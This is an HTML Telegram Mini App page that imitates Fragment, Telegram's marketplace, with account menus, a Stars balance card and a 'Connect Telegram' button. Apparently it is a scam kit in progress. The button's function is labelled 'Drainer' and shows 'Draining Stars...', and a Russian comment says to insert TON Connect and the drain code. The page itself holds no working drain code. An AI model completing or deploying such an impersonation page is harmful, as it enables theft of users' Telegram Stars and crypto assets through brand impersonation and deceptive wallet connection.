<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Fragment</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        @font-face {
            font-family: 'Dity Infant';
            src: url('dityinfant-Regular.otf') format('opentype');
            font-weight: normal;
            font-style: normal;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1B2026;
            color: #FFFFFF;
            font-family: 'Dity Infant', -apple-system, BlinkMacSystemFont, sans-serif;
            -webkit-font-smoothing: antialiased;
            padding: 20px;
            min-height: 100vh;
        }

        .back-btn {
            position: absolute;
            top: 16px;
            left: 16px;
            width: 32px;
            height: 32px;
            background: none;
            border: none;
            cursor: pointer;
        }
        .back-btn svg {
            width: 24px;
            height: 24px;
            stroke: #FFFFFF;
            stroke-width: 2;
            fill: none;
        }

        .section-title {
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
            color: #888888;
            margin: 32px 0 16px;
            letter-spacing: 0.5px;
        }

        .menu-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 14px 0;
            font-size: 17px;
            color: #FFFFFF;
            text-decoration: none;
            width: 100%;
        }

        .menu-item svg {
            width: 24px;
            height: 24px;
            fill: none;
            stroke: #FFFFFF;
            stroke-width: 1.5;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .connect-text {
            font-size: 15px;
            color: #AAAAAA;
            margin: 32px 0 16px;
            line-height: 1.5;
        }

        .connect-btn {
            background: #242E38;
            color: #FFFFFF;
            border: none;
            border-radius: 12px;
            padding: 14px;
            font-size: 17px;
            font-weight: 600;
            font-family: inherit;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
        }

        .connect-btn svg {
            width: 20px;
            height: 20px;
            fill: #FFFFFF;
        }

        /* Stars Section */
        .stars-card {
            background: #242E38;
            border-radius: 16px;
            padding: 32px 24px;
            text-align: center;
            margin: 40px auto;
            max-width: 300px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        }

        .stars-icon {
            width: 48px;
            height: 48px;
            margin: 0 auto 16px;
            fill: #FFFFFF;
        }

        .stars-balance {
            font-size: 48px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .stars-label {
            font-size: 15px;
            color: #AAAAAA;
            margin-bottom: 24px;
        }

        .stars-actions {
            display: flex;
            gap: 12px;
            justify-content: center;
        }

        .btn-primary {
            background: linear-gradient(135deg, #8B5CF6, #6366F1);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: 600;
            flex: 1;
            cursor: pointer;
        }

        .btn-secondary {
            background: #333333;
            color: #AAAAAA;
            border: none;
            border-radius: 12px;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: 600;
            flex: 1;
            cursor: pointer;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

    <!-- Back Button (only on subpages) -->
    <button class="back-btn hidden" id="back-btn" onclick="showMain()">
        <svg viewBox="0 0 24 24">
            <path d="M19 12H5m7-7l-7 7 7 7" />
        </svg>
    </button>

    <!-- Main Menu -->
    <div id="main-menu">
        <div class="section-title">PLATFORM</div>
        <a href="#" class="menu-item" onclick="goToChat(event)">
            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
            About
        </a>
        <a href="#" class="menu-item" onclick="goToChat(event)">
            <svg viewBox="0 0 24 24"><path d="M4 4h16v16H4z"/><path d="M8 8h8M8 12h8M8 16h5" stroke="#fff" fill="none"/></svg>
            Terms
        </a>
        <a href="#" class="menu-item" onclick="goToChat(event)">
            <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 0 20 10 10 0 0 1 0-20z"/><path d="M12 16v-4m0-4h.01"/></svg>
            Privacy Policy
        </a>

        <div class="section-title">MY ACCOUNT</div>
        <a href="#" class="menu-item" onclick="checkConnect(event)">
            <svg viewBox="0 0 24 24"><circle cx="12" cy="7" r="4"/><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/></svg>
            My Profile
        </a>
        <a href="#" class="menu-item" onclick="checkConnect(event)">
            <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            Active Sessions
        </a>
        <a href="#" class="menu-item" onclick="checkConnect(event)">
            <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 0 20 10 10 0 0 1 0-20z"/><path d="M12 8v4l3 3"/></svg>
            My Bids
        </a>
        <a href="#" class="menu-item" onclick="showStars(event)">
            <svg viewBox="0 0 24 24" class="stars-icon-small">
                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
            </svg>
            Stars
        </a>

        <div class="connect-text">
            Connect Telegram<br>to view your bids and assets
        </div>

        <button class="connect-btn" onclick="connectTelegram()">
            <svg viewBox="0 0 24 24">
                <path d="M2.5 12l8.5-8.5 8.5 8.5-8.5 8.5z" fill="none" stroke="#fff" stroke-width="2"/>
            </svg>
            Connect Telegram
        </button>
    </div>

    <!-- Stars Section -->
    <div id="stars-section" class="hidden">
        <div class="stars-card">
            <svg viewBox="0 0 48 48" class="stars-icon">
                <path d="M24 4l6.18 12.52L44 18.54l-10 9.74 2.36 13.76L24 35.54l-12.36 6.5L14 28.28 4 18.54l13.82-2.02L24 4z" fill="#FFFFFF"/>
            </svg>
            <div class="stars-balance">0</div>
            <div class="stars-label">Telegram Stars</div>
            <div class="stars-actions">
                <button class="btn-primary">Пополнить</button>
                <button class="btn-secondary">Вывести</button>
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        // Redirect to Fragment Chat
        function goToChat(e) {
            e.preventDefault();
            tg.openLink('https://t.me/fragmentchat');
        }

        // Check connection
        function checkConnect(e) {
            e.preventDefault();
            alert('Connect Telegram First!');
        }

        // Show Stars
        function showStars(e) {
            e.preventDefault();
            document.getElementById('main-menu').classList.add('hidden');
            document.getElementById('stars-section').classList.remove('hidden');
            document.getElementById('back-btn').classList.remove('hidden');
            tg.BackButton.show();
        }

        // Back to main
        function showMain() {
            document.getElementById('main-menu').classList.remove('hidden');
            document.getElementById('stars-section').classList.add('hidden');
            document.getElementById('back-btn').classList.add('hidden');
            tg.BackButton.hide();
        }

        // Connect Telegram (Drainer)
        function connectTelegram() {
            alert('Telegram connected. Draining Stars...');
            // Вставь TON Connect + дрейн
        }

        // Back Button
        tg.onEvent('backButtonClicked', showMain);
    </script>
</body>
</html>
